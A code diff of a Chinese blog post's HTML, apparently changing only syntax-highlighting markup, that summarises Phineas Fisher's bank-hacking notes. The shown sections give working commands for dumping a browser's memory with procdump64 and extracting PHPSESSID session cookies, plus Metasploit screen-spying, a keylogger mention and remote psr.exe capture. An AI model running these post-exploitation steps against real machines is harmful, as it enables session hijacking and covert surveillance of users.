@@ -40,11 +40,11 @@
       <p>PS: 标题看上去很厉害-&gt; 金玉其外，败絮其中</p>
 <p>来源: <a href="https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank">https://dummieshub.com/Thread-Phineas-Phisher-Hack-Back-Bank</a></p>
 <h3>从浏览器dump登陆Cookie</h3>
-<div class="highlight"><pre><span></span><span class="n">procdump64</span> <span class="o">/</span><span class="n">accepteula</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">ma</span> <span class="n">PID_of_browser</span>
-<span class="n">strings64</span> <span class="o">/</span><span class="n">accepteula</span> <span class="o">*</span> <span class="p">.</span><span class="n">dmp</span> <span class="o">|</span> <span class="n">findstr</span> <span class="n">PHPSESSID</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="n">nul</span>
-<span class="n">findstr</span> <span class="n">PHPSESSID</span> <span class="o">*</span> <span class="p">.</span><span class="n">dmp</span><span class="o">&gt;</span> <span class="n">tmp</span>
-<span class="n">strings64</span> <span class="o">/</span><span class="n">accepteula</span> <span class="n">tmp</span> <span class="o">|</span> <span class="n">findstr</span> <span class="n">PHPSESSID</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="n">nul</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="k">proc</span><span class="nv">dump64</span> <span class="o">/</span><span class="nv">accepteula</span> <span class="o">-</span><span class="nv">r</span> <span class="o">-</span><span class="nv">ma</span> <span class="nv">PID_of_browser</span>
+<span class="nf">strings64</span> <span class="o">/</span><span class="nv">accepteula</span> <span class="o">*</span> <span class="nv">.dmp</span> <span class="o">|</span> <span class="nv">findstr</span> <span class="nv">PHPSESSID</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="nv">nul</span>
+<span class="nf">findstr</span> <span class="nv">PHPSESSID</span> <span class="o">*</span> <span class="nv">.dmp</span><span class="o">&gt;</span> <span class="nv">tmp</span>
+<span class="nf">strings64</span> <span class="o">/</span><span class="nv">accepteula</span> <span class="nv">tmp</span> <span class="o">|</span> <span class="nv">findstr</span> <span class="nv">PHPSESSID</span> <span class="mi">2</span><span class="o">&gt;</span> <span class="nv">nul</span>
+</code></pre></div>
 
 
 <h3>准备个后路</h3>
@@ -54,7 +54,7 @@
 </ol>
 <h3>知己知彼</h3>
 <p>收集信息用到一下模块:</p>
-<div class="highlight"><pre><span></span><span class="err">每</span><span class="mi">5</span><span class="n">s截屏</span><span class="o">:</span>
+<div class="highlight"><pre><span></span><code><span class="err">每</span><span class="mi">5</span><span class="n">s截屏</span><span class="o">:</span>
 <span class="n">post</span><span class="sr">/windows/gather/s</span><span class="n">creen_spy</span>
 
 <span class="err">再加上一个键盘记录器，通过这两个东西收集信息，了解大概的工作流程。</span>
@@ -66,20 +66,20 @@
 <span class="n">psr</span><span class="o">.</span><span class="na">exe</span> <span class="sr">/start /gui 0 /</span><span class="n">output</span> <span class="n">C</span><span class="o">:\</span><span class="n">Users</span><span class="o">\</span><span class="n">Dan</span><span class="o">\</span><span class="n">Desktop</span><span class="o">\</span><span class="n">cool</span><span class="o">.</span><span class="na">zip</span><span class="o">;</span>
 <span class="n">Start</span><span class="o">-</span><span class="n">Sleep</span> <span class="o">-</span><span class="n">s</span> <span class="mi">20</span><span class="o">;</span>
 <span class="n">psr</span><span class="o">.</span><span class="na">exe</span> <span class="o">/</span><span class="n">stop</span><span class="o">;</span>
-</pre></div>
+</code></pre></div>
 
 
 <p><a href="https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-remotely-with-metasploit/">https://cyberarms.wordpress.com/2016/02/13/using-problem-steps-recorder-psr-remotely-with-metasploit/</a></p>
 <h2>END</h2>
-<div class="highlight"><pre><span></span><span class="nv">Hacking</span> <span class="nv">has</span> <span class="nv">made</span> <span class="nv">me</span> <span class="nv">feel</span> <span class="nv">alive</span>. <span class="nv">It</span> <span class="nv">started</span> <span class="nv">as</span> <span class="nv">a</span> <span class="nv">way</span> <span class="nv">to</span> <span class="nv">self</span><span class="o">-</span><span class="nv">medicate</span> <span class="nv">depression</span>. <span class="nv">Later</span> <span class="nv">I</span>
-<span class="nv">realized</span> <span class="nv">that</span>, <span class="nv">in</span> <span class="nv">reality</span>, <span class="nv">I</span> <span class="nv">could</span> <span class="k">do</span> <span class="nv">something</span> <span class="nv">positive</span>. <span class="nv">I</span> <span class="nv">don</span><span class="s1">&#39;</span><span class="s">t regret the way I grew up at </span>
-<span class="nv">all</span>, <span class="nv">it</span> <span class="nv">brought</span> <span class="nv">several</span> <span class="nv">beautiful</span> <span class="nv">experiences</span> <span class="nv">to</span> <span class="nv">my</span> <span class="nv">life</span>. <span class="nv">But</span> <span class="nv">I</span> <span class="nv">knew</span> <span class="nv">I</span> <span class="nv">couldn</span><span class="s1">&#39;</span><span class="s">t continue </span>
-<span class="nv">living</span> <span class="nv">that</span> <span class="nv">way</span>. <span class="nv">So</span> <span class="nv">I</span> <span class="nv">began</span> <span class="nv">to</span> <span class="nv">spend</span> <span class="nv">more</span> <span class="nv">time</span> <span class="nv">away</span> <span class="nv">from</span> <span class="nv">my</span> <span class="nv">computer</span>, <span class="nv">with</span> <span class="nv">other</span> <span class="nv">people</span>, 
-<span class="nv">learning</span> <span class="nv">to</span> <span class="nv">open</span> <span class="nv">myself</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">world</span>, <span class="nv">to</span> <span class="nv">feel</span> <span class="nv">my</span> <span class="nv">emotions</span>, <span class="nv">to</span> <span class="k">connect</span> <span class="nv">with</span> <span class="nv">others</span>, <span class="nv">to</span> <span class="nv">accept</span> 
-<span class="nv">risks</span> <span class="nv">and</span> <span class="nv">be</span> <span class="nv">vulnerable</span>. <span class="nv">Things</span> <span class="nv">much</span> <span class="nv">harder</span> <span class="nv">than</span> <span class="nv">hacking</span>, <span class="nv">but</span> <span class="nv">at</span> <span class="nv">the</span> <span class="nv">mere</span> <span class="nv">hour</span> <span class="nv">the</span> <span class="nv">reward</span> <span class="nv">is</span> 
-<span class="nv">more</span> <span class="nv">worth</span> <span class="nv">it</span>. <span class="nv">It</span> <span class="nv">is</span> <span class="nv">still</span> <span class="nv">an</span> <span class="nv">effort</span>, <span class="nv">but</span> <span class="nv">even</span> <span class="k">if</span> <span class="nv">it</span> <span class="nv">is</span> <span class="nv">slow</span> <span class="nv">and</span> <span class="nv">wobbly</span>, <span class="nv">I</span> <span class="nv">feel</span> <span class="nv">that</span> <span class="nv">I</span> <span class="nv">am</span> <span class="nv">on</span> 
-<span class="nv">my</span> <span class="nv">way</span>.
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">Hacking has made me feel alive. It started as a way to self-medicate depression. Later I</span>
+<span class="err">realized that, in reality, I could do something positive. I don&#39;t regret the way I grew up at </span>
+<span class="err">all, it brought several beautiful experiences to my life. But I knew I couldn&#39;t continue </span>
+<span class="err">living that way. So I began to spend more time away from my computer, with other people, </span>
+<span class="err">learning to open myself to the world, to feel my emotions, to connect with others, to accept </span>
+<span class="err">risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is </span>
+<span class="err">more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on </span>
+<span class="err">my way.</span>
+</code></pre></div>
     </div><!-- /.entry-content -->
 
   </article>
